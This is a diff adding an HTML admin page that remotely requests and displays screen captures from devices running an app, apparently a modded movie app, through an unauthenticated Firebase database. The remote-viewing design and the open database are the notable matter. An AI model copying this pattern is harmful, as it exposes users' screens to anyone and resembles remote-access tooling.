@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Admin Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-app.js"></script>
+    <style>
+        body { font-family: sans-serif; background: #f1f2f6; margin: 0; }
+        .container { max-width: 600px; margin: 20px auto; }
+        .card { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        h2 { margin-top: 0; color: #2d3436; }
+        .btn { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; color: white; font-weight: bold; margin-right: 10px; }
+        .btn-lock { background: #d63031; }
+        .btn-unlock { background: #00b894; }
+        .btn-off { background: #636e72; }
+        .viewer { width: 100%; height: 400px; background: black; margin-top: 20px; display: flex; align-items: center; justify-content: center; }
+        # Viewer Style
+        # Viewer Style
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <h2>Remote Screencast Control</h2>
+        <div>
+            <button id="btn-request" class="btn btn-lock" onclick="requestScreencast()">REQUEST SCREENCEST</button>
+            <button id="btn-off" class="btn btn-off" onclick="offScreencast()">OFF FUNCTION</button>
+        </div>
+        <div id="status" style="color: #666; font-size: 14px; margin-top: 10px;">Waiting for stream...</div>
+    </div>
+
+    <!-- Viewer Window -->
+    <div id="viewer-container" class="viewer" style="display:none;">
+        <img id="screen-image" src="" style="width: 100%; height: 100%; object-fit: contain;">
+    </div>
+
+</div>
+
+<!-- FIREBASE CONFIG (Same as Python) -->
+<script>
+    const FIREBASE_DB_URL = "https://vipteammod-movies-default-rtdb.firebaseio.com";
+    const SCREENCAST_REQUEST_PATH = "app_controls2/screencast_request2";
+    const SCREENCAST_DATA_PATH = "app_controls2/screencast_data2";
+
+    // Initialize Firebase
+    // You need your firebaseConfig object here for v9+
+    const firebaseConfig = {
+        apiKey: "AIzaSy...YOUR_API_KEY...", 
+        authDomain: "vipteammod-movies.firebaseapp.com",
+        databaseURL: FIREBASE_DB_URL,
+        projectId: "vipteammod-movies",
+        storageBucket: "vipteammod-movies.appspot.com",
+        messagingSenderId: "...",
+        appId: "1:123456789:android:...",
+        measurementId: "G-..."
+    };
+    
+    // If using simple REST (easier for Admin Panel without auth)
+    function getFirebase(path) {
+        return fetch(`${FIREBASE_DB_URL}/${path}.json`)
+            .then(res => res.json());
+    }
+
+    function sendFirebase(path, data) {
+        return fetch(`${FIREBASE_DB_URL}/${path}.json`, {
+            method: 'PUT',
+            body: JSON.stringify(data),
+            headers: { 'Content-Type': 'application/json' }
+        });
+    }
+
+    let lastImageHash = null;
+
+    function updateStream() {
+        getFirebase(SCREENCAST_DATA_PATH).then(data => {
+            const statusDiv = document.getElementById('status');
+            const imgDiv = document.getElementById('screen-image');
+            
+            if (data && data.length > 500) {
+                if (data !== lastImageHash) {
+                    lastImageHash = data;
+                    statusDiv.innerText = "Receiving data...";
+                    // Set Base64 to Image
+                    imgDiv.src = "data:image/jpeg;base64," + data;
+                }
+            } else {
+                statusDiv.innerText = "No Stream";
+            }
+        });
+    }
+
+    function requestScreencast() {
+        sendFirebase(SCREENCAST_REQUEST_PATH, true);
+        document.getElementById('btn-request').disabled = true;
+        document.getElementById('status').innerText = "Request Sent (Waiting for user permission)...";
+        
+        // Show Viewer
+        document.getElementById('viewer-container').style.display = 'flex';
+        
+        // Start Polling
+        setInterval(updateStream, 2000); 
+    }
+
+    function offScreencast() {
+        sendFirebase(SCREENCAST_REQUEST_PATH, false);
+        document.getElementById('btn-request').disabled = false;
+        document.getElementById('status').innerText = "Screencast Function Turned OFF";
+        
+        // Hide Viewer
+        document.getElementById('viewer-container').style.display = 'none';
+    }
+
+</script>
+
+</body>
+</html>
